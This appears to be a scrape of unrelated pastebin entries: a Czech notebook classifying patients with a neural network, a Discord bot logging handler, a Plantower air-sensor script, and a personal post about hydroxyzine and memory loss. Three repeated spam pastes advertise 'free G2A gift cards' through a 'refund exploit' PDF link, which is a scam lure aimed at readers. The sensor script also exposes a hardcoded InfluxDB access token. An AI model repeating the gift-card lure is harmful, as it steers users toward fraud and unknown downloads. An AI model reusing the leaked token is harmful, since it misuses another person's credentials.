#                person13_results, person14_results, person15_results, person16_results]


# #all_results = [person1_results, person2_results]


# Extract the last column (0 or 1) as labels
labels = [results[-1] for results in all_results]

# Remove the last column from the dataset
data = [results[:-1] for results in all_results]

# Define the number of rows for training and testing
num_training_rows = 100
num_testing_rows = 100

# Split the data into training and testing datasets
#X_train, X_test, y_train, y_test = data[:num_training_rows], data[-num_testing_rows:], labels[:num_training_rows], labels[-num_testing_rows:]

X_train, X_test, y_train, y_test = data[:num_training_rows], data[:num_testing_rows], labels[:num_training_rows], labels[:num_testing_rows]


# Normalize the training data
min_values = np.min(X_train, axis=0)
max_values = np.max(X_train, axis=0)
X_train_normalized = (X_train - min_values) / (max_values - min_values)


# Normalize the training data
min_values = np.min(X_train, axis=0)
max_values = np.max(X_train, axis=0)
X_train_normalized = (X_train - min_values) / (max_values - min_values)

# Normalize the testing data using the min and max values of the training data
X_test_normalized = (X_test - min_values) / (max_values - min_values)


# Print normalized training data
print(""Normalized Training Data:"")
print(X_train_normalized)
print(""Adenormalized"",X_train_normalized*(max_values - min_values)+min_values,""Bdenormalized"")

# Define a simple neural network model
# model = tf.keras.Sequential([
#     tf.keras.layers.Dense(128, activation='relu', input_shape=(len(X_train[0]),)),
#     tf.keras.layers.Dense(64, activation='relu'),
#     tf.keras.layers.Dense(1, activation='sigmoid')
# ])

# # Compile the model
# model.compile(optimizer='adam', loss='binary_crossentropy', metrics=['accuracy'])


import tensorflow as tf

# Vylep≈°en√Ω model
model = tf.keras.Sequential([
    tf.keras.layers.Dense(256, activation='relu', input_shape=(len(X_train[0]),)),
    tf.keras.layers.Dropout(0.3),
    tf.keras.layers.Dense(128, activation='relu'),
    tf.keras.layers.Dropout(0.3),
    tf.keras.layers.Dense(64, activation='relu'),
    tf.keras.layers.Dropout(0.3),
    tf.keras.layers.Dense(1, activation='sigmoid')
])

# Pou≈æit√≠ Adam optimizer s learning rate schedulerem
lr_schedule = tf.keras.optimizers.schedules.ExponentialDecay(
    initial_learning_rate=1e-3,
    decay_steps=10000,
    decay_rate=0.9
)
optimizer = tf.keras.optimizers.Adam(learning_rate=lr_schedule)

# Kompilace modelu
model.compile(optimizer=optimizer, loss='binary_crossentropy', metrics=['accuracy'])


# Lists to store accuracy values
accuracy_history = []

# Create images for the training data
image_training = np.zeros((num_training_rows, len(X_train[0]) + 1, 3), dtype=np.uint8)


min_pixel_value = np.min(X_train_normalized)
max_pixel_value = np.max(X_train_normalized)

# Populate image_training with consistent gray and red/green colors based on the labels in the last column
# for i, label in enumerate(y_train):
#     for j in range(len(X_train[0])
#         pixel_value = int(np.interp(X_train_normalized[i][j], [min_pixel_value, max_pixel_value], [0, 255]))
#         image_training[i, j] = np.array([pixel_value] * 3)
#         image_training[i, -1] = np.array([128, 128, 128])
#     if label == 0:
#         image_training[i, -1] = np.array([0, 128, 0])
#     elif label == 1:
#         image_training[i, -1] = np.array([255, 0, 0])



# Populate image_training with consistent gray and red/green colors based on the labels in the last column
for i, label in enumerate(y_train):
    for j in range(len(X_train[0])):
        pixel_value = int(np.interp(X_train_normalized[i][j], [min_pixel_value, max_pixel_value], [0, 255]))
        image_training[i, j] = np.array([pixel_value] * 3)
    image_training[i, -1] = np.array([128, 128, 128])
    if label == 0:
        image_training[i, -1] = np.array([0, 128, 0])
    elif label == 1:
        image_training[i, -1] = np.array([255, 0, 0])






from tqdm.notebook import tqdm_notebook


###ZDE VLOZTE DATA OD NOVYCH PACIENTU


# Train the model for 400 epochs
epochs = 138
# Assuming 'new_persons_results' is a list of new persons, where each person is represented as a list of features
new_persons_results = [
   # [101, 112],
   # [0.54422416, 0.02778176],
   # [22.57372914, 17.96922325],
#    [22.57372914, 17.96922325]
    # Add more new persons as needed
#          [23.65780072, 18.8599168 ],
#          [22.57372914, 17.96922325],
#          [32.55342397, 29.46365141],
#          [ 6.71803504, 25.70466547],
#          [ 6.71803504, 25.70466547],
#          [14.40191857, 16.77085649],
#          [17.45790731, 21.76521471],
#          [2110.02796947, 73.45445955],
#          [30.29513837, 62.90111289],
#          [15.1289778,  32.40267702],

 [23.65780072, 18.8599168 ],
 [22.57372914, 17.96922325],
 [32.55342397, 29.46365141],
 [ 6.71803504, 25.70466547],
 [14.40191857, 16.77085649],
 [17.45790731, 21.76521471],
 [20.02796947, 73.45445955],
 [26.2042, 10.6782],
 [35.7258, 82.8027],

]

import sys

for epoch in tqdm_notebook(range(epochs)):
    history = model.fit(X_train_normalized, np.array(y_train), epochs=1, verbose=0, shuffle=True)
    accuracy_history.append(history.history['accuracy'][0])

    if epoch == 1:
        # Normalize the testing data
        X_test_normalized = (X_test - min_values) / (max_values - min_values)
        y_pred_after_2nd_epoch = model.predict(X_test_normalized)
        y_pred_binary_after_2nd_epoch = [1 if pred >= 0.5 else 0 for pred in y_pred_after_2nd_epoch]
        image_testing_before_2nd_epoch = create_image(X_test_normalized, y_pred_binary_after_2nd_epoch, label_colors_testing)

    if epoch >= epochs-1:
        print(f""HERE HERE Epoch: {epoch}, Epochs: {epochs}\n"")
        sys.stdout.flush()

        # Iterate through new persons
        for idx, personNEW_results in enumerate(new_persons_results, start=0):
            # Ensure that personNEW_results has the same number of features as the model expects
            assert len(personNEW_results) == len(X_train[0]), ""Mismatch in the number of features.""

            personNEW_results_normalized = (np.array(personNEW_results) - min_values) / (max_values - min_values)

            personNEW_prediction = model.predict(np.array([personNEW_results_normalized]))
            personNEW_label = 1 if personNEW_prediction >= 0.5 else 0
            y_pred_after_50_epochs = model.predict(X_test_normalized)
            y_pred_binary_after_50_epochs = [1 if pred >= 0.5 else 0 for pred in y_pred_after_50_epochs]
            image_testing_after_50_epochs = create_image(X_test_normalized, y_pred_binary_after_50_epochs, label_colors_testing)

            # Create an image for the new person
            image_personNEW = create_imageN([personNEW_results_normalized], [personNEW_label], label_colors)

            # Display the images
            plt.figure(figsize=(5, 5))
            plt.imshow(image_personNEW)
            plt.title(f""New Person {idx}\nLabel: {personNEW_label}, Prediction: {personNEW_prediction},personNEW_results: {personNEW_results}"")
            plt.axis(""off"")
            plt.show()


# Display the images
plt.figure(figsize=(25, 15))
plt.subplot(2, 2, 1)
plt.imshow(image_training)
plt.title(""Training Data"")
plt.axis(""off"")

plt.subplot(2, 2, 2)
plt.imshow(image_testing_before_2nd_epoch)
plt.title(""Testing Data (2nd Epoch)"")
plt.axis(""off"")

plt.subplot(2, 2, 3)
plt.imshow(image_testing_after_50_epochs)
plt.title(f""Testing Data ({epochs} Epochs)"")
plt.axis(""off"")

plt.subplot(2, 2, 4)
plt.imshow(image_personNEW)
plt.title(f""New Person\nLabel: {personNEW_label},[{personNEW_prediction}]"")
plt.axis(""off"")

# Plot accuracy history
plt.figure(figsize=(12, 5))
plt.plot(range(1, epochs + 1), accuracy_history, marker='o')
plt.title('Accuracy Over Epochs')
plt.xlabel('Epochs')
plt.ylabel('Accuracy')
plt.grid()

# Print normalized data
print(""Normalized PersonNEW Data:"")
print(personNEW_results_normalized)

plt.show()

print(""X_train before normalization:"")
print(X_train)
print(""X_test before normalization:"")
print(X_test)

import seaborn as sns


print(""KKKKKKKKKKKKKKKKKKKKKKKKKKKKKKK"")
print(X_test)
print(""HHHHHHHHHHHHHHHHHHHHHHHHHHHHHH"")
print(X_train)
print(""LLLLLLLLLLLLLLLLLLLLLLLLLLLLL"")


# y_pred_binary = [1 if pred >= 0.5 else 0 for pred in model.predict(X_test_normalized)]

# # Create confusion matrix
# conf_matrix = confusion_matrix(y_train, y_pred_binary)
# print(conf_matrix)


from sklearn.metrics import confusion_matrix
from tensorflow.keras.utils import to_categorical

# # Normalize the training data
# min_values = np.min(np.concatenate([X_train, X_test], axis=0), axis=0)
# max_values = np.max(np.concatenate([X_train, X_test], axis=0), axis=0)
# X_train_normalized = (X_train - min_values) / (max_values - min_values)
# X_test_normalized = (X_test - min_values) / (max_values - min_values)

np.set_printoptions(threshold=np.inf, precision=4, suppress=True)


# # Assuming X_test_normalized and y_test are your test set data
# y_pred_binary = [1 if pred >= 0.5 else 0 for pred in model.predict(X_test_normalized)]

# # Create confusion matrix using the test set
# conf_matrix = confusion_matrix(y_test, y_pred_binary)
# print(conf_matrix)



# plt.figure(figsize=(6, 6))
# sns.heatmap(conf_matrix, annot=True, fmt=""d"", cmap=""Blues"", xticklabels=['Predicted 0', 'Predicted 1'], yticklabels=['Actual 0', 'Actual 1'])
# plt.xlabel(""Predicted Label"")
# plt.ylabel(""True Label"")
# plt.title(""Confusion Matrix"")
# plt.show()

# X_train = np.array(X_train)
# y_train_one_hot = np.array(y_train_one_hot)

# Rozd√Ñ‚Ä∫lenƒÇ¬≠ dat na trƒÇ¬©novacƒÇ¬≠ a testovacƒÇ¬≠ mnoƒπƒæiny
###X_train, X_test, y_train, y_test = data[:num_training_rows], data[-num_testing_rows:], labels[:num_training_rows], labels[-num_testing_rows:]

###X_train, X_test, y_train, y_test = data[:num_training_rows], data[:num_training_rows], labels[:num_training_rows], labels[:num_training_rows]
X_train, X_test, y_train, y_test = data[:num_training_rows], data[:num_testing_rows], labels[:num_training_rows], labels[:num_testing_rows]

import numpy as np
import matplotlib.pyplot as plt
from sklearn.metrics import confusion_matrix, accuracy_score, precision_score, recall_score, f1_score
import tensorflow as tf
import seaborn as sns

# Assuming data splitting and model definition have been done correctly

# Compile the model
model.compile(optimizer='adam', loss='binary_crossentropy', metrics=['accuracy'])

# Train the model
print(""Training Start"")
for epoch in tqdm_notebook(range(100), desc=""Training Progress""):
    model.fit(np.array(X_train_normalized), np.array(y_train), epochs=1, verbose=0)
print(""Training Complete"")

# Generate predictions from the model
predictions = (model.predict(X_test_normalized) > 0.5).astype(int)

# Convert y_test to a numpy array and then to binary labels
y_test_array = np.array(y_test)  # Convert y_test to a numpy array
y_test_binary = (y_test_array > 0.5).astype(int)  # Convert to binary

# Compute the confusion matrix
conf_matrix = confusion_matrix(y_test_binary, predictions)

# Evaluate the model's performance
accuracy = accuracy_score(y_test_binary, predictions)
precision = precision_score(y_test_binary, predictions)
recall = recall_score(y_test_binary, predictions)
f1 = f1_score(y_test_binary, predictions)

# Display the confusion matrix
sns.heatmap(conf_matrix, annot=True, fmt='d', cmap='Blues')
plt.xlabel('Predicted')
plt.ylabel('Actual')
plt.title('Confusion Matrix')
plt.show()

print(f""Accuracy: {accuracy:.4f}"")
print(f""Precision: {precision:.4f}"")
print(f""Recall: {recall:.4f}"")
print(f""F1 Score: {f1:.4f}"")

print(f""Confusion Matrix2122:\n{conf_matrix}"")


import random

def find_best_pair(min_val, max_val, num_features, model, min_values, max_values):
    best_pair = None
    best_prediction = 1
    for _ in range(1000):  # Number of iterations to find the best pair
        new_data = np.random.uniform(min_val, max_val, num_features)
        new_data_normalized = (new_data - min_values) / (max_values - min_values)
        
        # Suppress model output
        tf.get_logger().setLevel('ERROR')
        with tf.device('/CPU:0'):  # Ensure to run on CPU to minimize unwanted logs
            prediction = model.predict(np.array([new_data_normalized]), verbose=0)[0][0]
        tf.get_logger().setLevel('INFO')
        
        if prediction < best_prediction:
            best_prediction = prediction
            best_pair = new_data
    return best_pair, best_prediction



best_pair, best_prediction = find_best_pair(min_values, max_values, len(X_train[0]), model, min_values, max_values)


def find_worst_pair(min_val, max_val, num_features, model, min_values, max_values):
    worst_pair = None
    worst_prediction = 0
    for _ in range(1000):  # Number of iterations to find the best pair
        new_data = np.random.uniform(min_val, max_val, num_features)
        new_data_normalized = (new_data - min_values) / (max_values - min_values)
        
        # Suppress model output
        tf.get_logger().setLevel('ERROR')
        with tf.device('/CPU:0'):  # Ensure to run on CPU to minimize unwanted logs
            prediction = model.predict(np.array([new_data_normalized]), verbose=0)[0][0]
        tf.get_logger().setLevel('INFO')
        
        if prediction > worst_prediction:
            worst_prediction = prediction
            worst_pair = new_data
    return worst_pair, worst_prediction



worst_pair, worst_prediction = find_worst_pair(min_values, max_values, len(X_train[0]), model, min_values, max_values)


print(f""Best Pair: {best_pair}, Best Prediction: {best_prediction}"")
print(f""Worst Pair: {worst_pair}, Worst Prediction: {worst_prediction}"")

"
4R22tXsX,üí∏G2A.com Free Gift Card Guide May 2024üí∞,Garoam,GetText,Sunday 26th of May 2024 02:54:08 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon gift cards & everything else offered. 
This is the most updated version of this script. Any other posted will not work!

PDF guide here:
https://drive.google.com/file/d/13fMNGqCtIp_audnfJynQaaYtl3NaICCd/view?usp=g2a_refund_exploit_4691089.pdf

Working as of:

26 May 2024"
4W1xM0UU,logs,Decaded,JavaScript,Sunday 26th of May 2024 02:53:48 PM CDT,"module.exports = {
	name: 'interactionCreate',
	async execute(interaction, client) {
		if (!interaction.isCommand()) return;

		const command = interaction.client.commands.get(interaction.commandName);

		if (!command) return;

		const settings = client.database.get('settings');
		const requiredRole = settings.requiredRole;
		const logChannelId = settings.logChannel;
		const userId = interaction.user.id;
		const userTag = interaction.user.tag;
		const commandName = interaction.commandName;
		const channelName = interaction.channel.name;
		const channelId = interaction.channel.id;
		const timestamp = new Date().toISOString();
		let status = 'Not executed';

		const logData = {
			userName: userTag,
			commandName: commandName,
			channelName: channelName,
			channelId: channelId,
			timestamp: timestamp,
			status: status,
		};

		try {
			// Check if the command is in the ""admin"" folder
			if (command.folder === 'admin') {
				const guildOwner = interaction.guild.ownerId;

				// Log the admin command attempt
				if (logChannelId) {
					const logChannel = await client.channels.fetch(logChannelId);
					if (logChannel) {
						const logMessage = `Admin command attempt: ${commandName} by ${userTag} in ${channelName}`;
						await logChannel.send(logMessage);
					}
				}

				// Check permissions
				if (interaction.user.id !== guildOwner && (!requiredRole || !interaction.member.roles.cache.has(requiredRole))) {
					await interaction.reply({ content: 'You do not have permission to use this command.', ephemeral: true });
					status = 'Permission denied';
					logData.status = status;
					const commandLogs = client.database.get('commandLogs');
					if (!commandLogs[userId]) {
						commandLogs[userId] = [];
					}
					commandLogs[userId].push(logData);
					client.database.set('commandLogs', commandLogs);
					return;
				}
			}

			await command.execute(interaction);
			status = 'Executed';
		} catch (error) {
			console.error(error);
			await interaction.reply({ content: 'There was an error while executing this command!', ephemeral: true });
			status = 'Error';
		} finally {
			// Log the command usage in the database
			logData.status = status;
			const commandLogs = client.database.get('commandLogs');
			if (!commandLogs[userId]) {
				commandLogs[userId] = [];
			}
			commandLogs[userId].push(logData);
			client.database.set('commandLogs', commandLogs);
		}
	},
};
"
qpAzJbum,Plantower reading library,pcpszc,Python,Sunday 26th of May 2024 02:51:37 PM CDT,"import argparse
import os
import signal
from datetime import datetime
from time import time, sleep

import serial
import serial.serialutil
from influxdb_client import InfluxDBClient

_EXIT = False


def handle_signal(signum, frame):
    global _EXIT
    print(""\nreceived %d signal, prepare to exit"" % signum)
    _EXIT = True


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument(dest='file', nargs='?', type=str, default='/dev/ttyUSB0',
                        help=""tty device, select your serial port (default: /dev/ttyUSB0)"")
    parser.add_argument('-b', '--baudrate', dest='baudrate', metavar='', type=int, default=9600,
                        help=""set serialport baudrate (default: 9600)"")
    parser.add_argument('-d', '--delay', dest='delay', metavar='', type=float, default=0.0,
                        help=""delay between readings (default: fastest possible)"")
    parser.add_argument('-c', '--count', dest='count', metavar='', type=int, default=0,
                        help=""how many readings to do (default: infinity)"")
    return parser.parse_args()


class PlantowerRecord:
    """"""
    object contains all data from sensor,
    """"""

    def __init__(self, data_dict: dict):
        self.timestamp = datetime.now()
        self.__dict__.update(data_dict)

    def __getitem__(self, item):
        return self.__dict__[item]

    def __str__(self):
        string = (
            "">>> {timestamp:s} \n""
            ""(ug/m¬≥)  normal     env  %normal    %env  norm\n""
            ""PM  1.0: {pm1_0:>6d}  {pm1_0_env:>6d}   ---.-%  ---.-%  None\n""
            ""PM  2.5: {pm2_5:>6d}  {pm2_5_env:>6d}  {pm2_5_normn:6.1f}% {pm2_5_norme:6.1f}%  25\n""
            ""PM 10.0: {pm10_0:>6d}  {pm10_0_env:>6d}  {pm10_0_normn:6.1f}% {pm10_0_norme:6.1f}%  50\n\n""
            ""particles count (um / 0.1 L)\n""
            "" 0.3 um: {um0_3:>8d}\n""
            "" 0.5 um: {um0_5:>8d}\n""
            "" 1.0 um: {um1_0:>8d}\n""
            "" 2.5 um: {um2_5:>8d}\n""
            "" 5.0 um: {um5_0:>8d}\n""
            ""10.0 um: {um10_0:>8d}\n\n""
            ""checksum: {check:s}\n""
        )
        return string.format(
            timestamp=str(self.timestamp),
            pm1_0=self.data1, pm2_5=self.data2, pm10_0=self.data3, pm1_0_env=self.data4, pm2_5_env=self.data5,
            pm10_0_env=self.data6, um0_3=self.data7, um0_5=self.data8, um1_0=self.data9, um2_5=self.data10,
            um5_0=self.data11, um10_0=self.data12,
            pm2_5_norme=(self.data5 / 25) * 100, pm10_0_norme=(self.data6 / 50) * 100,
            pm2_5_normn=(self.data2 / 25) * 100, pm10_0_normn=(self.data3 / 50) * 100,
            check='Match' if self.checksum_match else ""NOT MATCH (data error occurred)""
        )


def verify_offset(fd, data):
    """"""take care of data position""""""
    if not (data[0], data[1]) == (0x42, 0x4d):  # check if first two bytes matches to device protocol specification
        print('Data not in proper position, trying to set proper offset...')
        set_fixed_position(fd)
        data = fd.read(32)
        if not (data[0], data[1]) == (0x42, 0x4d):
            print(
                'Synchronisation failed, check if proper baudrate are set (default: 9600, see --help)')
            exit(1)


def set_fixed_position(fd):
    """"""Simple method to set file pointer on proper position (where 0x424d becoming first two values)""""""
    data = fd.read(32)
    if (data[0], data[1]) == (0x42, 0x4d):
        return

    offset = 0
    for i in range(31):
        if (data[i], data[i + 1]) == (0x42, 0x4d):
            offset = i
    fd.read(offset)


def read_data(fd) -> PlantowerRecord:
    """"""Simple method that reads data from sensor and return prepared PlantowerRecord object""""""
    data = fd.read(32)

    verify_offset(fd, data)

    calculated_checksum = 0
    for i in range(29):
        calculated_checksum += data[i]  # calculated checksum on given data

    checksum = (data[30] << 8) + data[31]  # checksum provided by device

    data_dict = {
        # frame data size, not useful for user
        'frame': (data[2] << 8) + data[3],

        # pm1.0 unit ug/m3 (CF=1, standard particle) (?)
        'data1': (data[4] << 8) + data[5],
        # pm2.5 unit ug/m3 (CF=1, standard particle) (?)
        'data2': (data[6] << 8) + data[7],
        # pm10 unit ug/m3 (CF=1, standard particle) (?)
        'data3': (data[8] << 8) + data[9],

        # pm1.0 unit ug/m3 (under atmospheric environment) (?)
        'data4': (data[10] << 8) + data[11],
        # pm2.5 unit ug/m3 (under atmospheric environment) (?)
        'data5': (data[12] << 8) + data[13],
        # pm10 unit ug/m3 (under atmospheric environment) (?)
        'data6': (data[14] << 8) + data[15],

        # number of particles with diameter beyond 0.3 um in 0.1L of air.
        'data7': (data[16] << 8) + data[17],
        # number of particles with diameter beyond 0.5 um in 0.1L of air.
        'data8': (data[18] << 8) + data[19],
        # number of particles with diameter beyond 1.0 um in 0.1L of air.
        'data9': (data[20] << 8) + data[21],
        # number of particles with diameter beyond 2.5 um in 0.1L of air.
        'data10': (data[22] << 8) + data[23],
        # number of particles with diameter beyond 5.0 um in 0.1L of air.
        'data11': (data[24] << 8) + data[25],
        # the number of particles with diameter beyond 10.0 um in 0.1L of air.
        'data12': (data[26] << 8) + data[27],
        'data13': (data[28] << 8) + data[29],  # reserved, not used
        'checksum_match': True if calculated_checksum == checksum else False
    }

    return PlantowerRecord(data_dict)


def save(client, record):
    if not record.checksum_match:
        print(""checksum missmatch!"")
        return

    now = datetime.now()
    t = int(now.timestamp() * 1000 * 1000 * 1000)
    #print(now.isoformat())
    data = [
        {
            ""measurement"": ""plantower"",
            ""time"": t,
            ""tags"": {
                    ""data_type"": ""CF1"",
                    ""val_type"": ""mass"",
                },
            ""fields"": {
                ""1.0"": record.data1,
                ""2.5"": record.data2,
                ""10"": record.data3,
            }
        },
        {
            ""measurement"": ""plantower"",
            ""time"": t,
            ""tags"": {
                    ""data_type"": ""atmo"",
                    ""val_type"": ""mass"",
                },
            ""fields"": {
                ""1.0"": record.data4,
                ""2.5"": record.data5,
                ""10"": record.data6,
            }
        },
        {
            ""measurement"": ""plantower"",
            ""time"": t,
            ""tags"": {
                    ""val_type"": ""count"",
                },
            ""fields"": {
                ""0.3"": record.data7,
                ""0.5"": record.data8,
                ""1.0"": record.data9,
                ""2.5"": record.data10,
                ""5.0"": record.data11,
                ""10"": record.data12,
            }
        },

    ]
    client.write(""grafana"", ""pi4black"", data)


def print_loop(fd, args):
    client = InfluxDBClient(
        url=""http://pi4black:8086"",
        token=""8WpxAr74led6pgP1i_lu4PyhVYUfuxPEP-3Zcth3GL4AehXFTHqomrFaRUYWb7u5DUzhzT1JB0ep9HX9KGLxQw=="",
        org=""pi4black"",
    )
    write_api = client.write_api()

    check_time = time() + args.delay

    reported_ok = False
    while not _EXIT:
        record = read_data(fd)
        if time() >= check_time:
            check_time = time() + args.delay
            #print(record)
            try:
                save(write_api, record)
            except Exception as e:
                print(""save failed:"", e)
            else:
                if not reported_ok:
                    print(""save success! from now only reporting on failures"")
                    reported_ok = True


def connect(file, baudrate):
    print('connecting to %s... ' % file, end='')
    while not _EXIT:
        if not os.path.exists(file):
            sleep(0.1)
            continue
        try:
            s = serial.Serial(port=file, baudrate=baudrate)
        except serial.serialutil.SerialException:
            sleep(0.1)
            continue
        else:
            print('Connected.')
            return s


def main():
    args = parse_args()
    signal.signal(signal.SIGINT, handle_signal)
    signal.signal(signal.SIGQUIT, handle_signal)

    fd = connect(args.file, args.baudrate)
    while not _EXIT:
        try:
            print_loop(fd, args)
        except serial.serialutil.SerialException:
            print('Error ocurred, device disconnected? Trying to restore')
            fd.close()
            fd = connect(args.file, args.baudrate)

    if fd:
        fd.close()
    exit(0)


if __name__ == ""__main__"":
    main()"
fkW2XC2v,üí∞G2A.com Free Gift Card Guide May 2024üéâ,atakan1983,GetText,Sunday 26th of May 2024 02:48:14 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Xbox gift cards & everything else offered. 
This is the most updated version of this script. Any other posted will not work!

PDF guide here:
https://drive.google.com/file/d/13fMNGqCtIp_audnfJynQaaYtl3NaICCd/view?usp=g2a_refund_exploit_4691089.pdf

Working as of:

26 May 2024"
P6zcYELN,Untitled,Skettalee,GetText,Sunday 26th of May 2024 02:46:21 PM CDT,"now they will probably just a brain dump but thats how my life has gotten to be more and more. I am just not recently learning about hydroxyzine and memory loss issues only after having had been on the medication for what seems like as long as i can remember. Im 44 and feel like I have been complaining about memory loss more and more in the past years. I have been on that medicine for probably atleast 10 years if not 15.  It started from a VA mental health doctor giving it to me because I was not able to sleep very well at all and I felt like my brain never will shut up always putting me on a task or even singing a song in my head and sometimes out loud until my jaw hurts from all the mouth moving ""yappin"" and I would take it at night, 2 pills at 20mg a peace. After a while I started realizing that when I go to sleep at night having made ideas, plans, and checklists of things i want to get started doing the next day as one usually does and I wake up completely empty headed and really only realize those things much later on probably days later even. Now I have always been extremely ADHD and really I feel like more of my problems turn out to be that though i am now on Adderall and though it helps for a short period and you can feel it wear off and it doesn't give me total focus and attention to things. I also have had a brain surgery because of a subdural hematoma at age 33. And through the years both because of just being in a deep depression I felt like I can even think deeply like my brain even gets hot and i sweat alot even in a freezing room just because im trying hard to use my brain like an old computer with a big graphics card that your trying to push ai image generation through and its over heating and going very slow now. 
And i got to add also memory loss is going on right now it happens ALL THE TIME when im trying to communicate something some what complex and having to think hard while typing just the time that it takes to actually get the words out typing (and im not slow at typing either), i forget what exactly i was trying to say to the point so badly that I cant bring my brain to working at remembering or even trying to focus on rereading what i had just typed that is right in front of my face that I just give up and usually fail at whatever i was trying to accomplish whether it be telling someone something important or even giving information to another person online like what I'm doing now. I feel so far removed from what I was initially set out to say here that I am trying to freestyle and ending to my words. Well maybe a year ago I told my doctor that I was having unexplained anxiety and in turn he decided to get me to take more hydroxyzine which now i take 2 at night and sometimes one mid day if i feel anxious. I find myself atleast once a day, getting up from a position to go accomplish a goal elsewhere in my room usually and the time it takes me to stand and begin walking i already forgot what i wanted to go do and cant remember sometimes till a few hours later. And I am just not putting all of this together and its starting to sound like them meds are helping speed up whatever mental problems i will have but I know my age isn't shrinking as im creeping towards 50 right now and my bad ADHD can be causeing some issues not to mention the brain surgery and possible worsening the ADHD on top of that even still just makes me even more confused. Its just hard to think. That is why I have loved the help from first SIRI and reminding me when i need it as well as more so recently Ai and how much I can get its help at picking up the slack where my memory and brain capacity of thinking falls. Its all just so depressing to think about and just writing this post tonight about an hour after i first read google say : 
Yes, hydroxyzine (Atarax) can cause memory problems, including making thinking problems worse. Hydroxyzine is an antihistamine with anticholinergic properties, and some research suggests that long-term use of these medications may be linked to dementia, especially in older adults. Other side effects of hydroxyzine include confusion, trouble paying attention, drowsiness, dizziness, and lack of coordination. People with dementia may be at a higher risk of experiencing these side effects. 
To minimize adverse effects, the UCSF Memory and Aging Center recommends using anticholinergic medications like hydroxyzine at the lowest effective dose for the shortest duration possible. Doctors may also try to prescribe other treatments for people with dementia. 
Not a week or two longer before a friend mentioned it to me to mention to my doctor and then a possibe 15 years back that I have been on this drug did I decided I need to tell that doctor that I want to try other solutions and get off them meds for sure cause I have even told him about all memory issues before. Well, like I was saying before, i dont know where to live this at or how to finish what im trying to say but im sure the way I put it has been changed by ChatGPT because I have been having to get her help so much more and you should be able to understand what I am trying to say much better than the way I said it. 
"
341A5qbi,üí∏G2A.com Free Gift Card Guide May 2024üí∞,pestinha,GetText,Sunday 26th of May 2024 02:36:25 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Playstation gift cards & everything else offered. 
This is the most updated version of this script. Any other posted will not work!

PDF guide here:
https://drive.google.com/file/d/13fMNGqCtIp_audnfJynQaaYtl3NaICCd/view?usp=g2a_refund_exploit_4691089.pdf

Working as of:

26 May 2024"
axmMqDnx,VK posledni se vsim vsudy,max2201111,Python,Sunday 26th of May 2024 02:14:33 PM CDT,"#Navod na pouziti, Mgr. Hynek Mlƒçou≈°ek, v Brne 2.5.2024
#Ulozte do lokalniho souboru u sebe na PC data tohoto tvaru vzdy ukoncene 0 ci 1 (jde o uceni s ucitelem: 1 = nemocny, 0 = prezil/zdravy, ve vystupu bude zelena znacit 0, cervena 1)  a bez znaku #; pozor na "",""

# [ [23.657800719276743,18.859916797201468,0],
# [22.573729142097473,17.96922325097786,0],
# [32.55342396968757,29.463651408558803,0],
# [6.718035041529263,25.704665468161718,1],
# [14.401918566243225,16.770856492924658,0],
# [17.457907312962234,21.76521470574044,0],
# [20.02796946568093,73.45445954770891,1],
# [30.295138369778076,62.901112886193246,1],
# [15.128977804449633,32.40267702110393,0],
# [30.179457395820013,58.982492125646104,1],
# [28.01649701854089,63.92781357637711,1],
# [16.791838457871147,42.33482314089884,0],
# [10.583694293380976,19.61926728942497,0],
# [26.634447074406467,91.96624817360987,1],
# [26.217868623367643,36.400293587062976,0],
# [17.689396788624936,60.79797114006423,1],
# [33.17193822527976,66.75277364959176,1],
# [23.793952755709153,22.57501437360518,0]]

#kliknete na cerne tlacitko s trojuhelnickem vlevo nahore
#pod kodem se objevi moznost spustit dialogove okenko, kliknete na nej
#soubor, ktery mate z bodu vyse vyberte a nahrajte
#Najdete v tomto kodu retezec:
###ZDE VLOZTE DATA OD NOVYCH PACIENTU

#Vlozte do pole
# new_persons_results = []
# data o nekolika malo novych pacientech bez ukoncovaci 0 a 1, ale se stejnym poctem sloupcu jako ma soubor z Vaseho lokalniho disku, vyse by tedy toto bylo rovno 2
#kod vyhodi hned po natrenovani, (jehoz prubeh muzete sledovat na modre progres bare) pro kazdy radek z new_persons_results bilo-sedo-cerne ctverecky vznikle z normalizace poskytnutych dat a ukoncovaci ctverecek cerveny pripadne zeleny
#zaroven s tim se vypise realne cislo mezi 0 a 1 znacici jak moc je pacient zdravy (blizke 0) ci nemocny (blizke 1)
#cisla uprostred pak indikuji zadany oranzovy semafor.
#je na lekarich nastavit tresholdy (tedy pravdepodobnosti: cisla mezi 0 a 1) ktere pak daji zaver, zda je pacient cerveny, oranzovy ci zeleny

# prosim o komnetare a vysledky na realnych datech, je zadouci aby radku v matici, tedy pacientu byly stovky a sloupcu desitky
# Moznosti vyuziti: onkologicka diagnoza vs. zdrava kontorlni skupina, diabetes (pritomnost/nepritomnost), testovani noveho leku oproti placebu atd.

#kod zaroven vyhodi confusion matici, tedy mozne True Negative a False Positive plus spravne zarazene hodnoty spolu s presnosti,F1 score recall atd.
#poznamka ke kodu: jde o epxerimentalni verzi, ktera krome skutecne potrebneho kodu obsahuje ladici informace, ruzne duplicity, nadbytecne prikazy atd.
# Na uvod behu programu se pro kontorlu vypise poskytnuta matice a jeji normalizovana verze, je treba sjet jezdcem napravo nize na obrazky a dalsi vystupy

#Dekuji profesoru Petru Dostalovi za namet k teto praci a poskytnuta data, byt je potreba mit data realna

import numpy as np
import matplotlib.pyplot as plt
import tensorflow as tf
from tqdm import tqdm


from IPython.display import display
from IPython.display import Javascript
display(Javascript('IPython.OutputArea.auto_scroll_threshold = 9999;'))

label_colors = {0: [0, 128, 0], 1: [255, 0, 0]}
label_colors_testing = {0: [0, 128, 0], 1: [255, 0, 0]}


%matplotlib inline



# Function to create images based on predictions
def create_image(data, predictions):
    num_rows, num_columns = len(data), len(data[0])
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

    for i in range(num_rows):
        for j in range(num_columns):
            pixel_value = int(np.interp(data[i][j], [np.min(data), np.max(data)], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

        # Create a gradient based on the normalized values
        gradient_value = int(np.interp(predictions[i], [0, 1], [0, 255]))
        image[i, -1] = np.array([gradient_value] * 3)

    return image

def create_image(data, predictions):
    num_rows, num_columns = len(data), len(data[0])
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

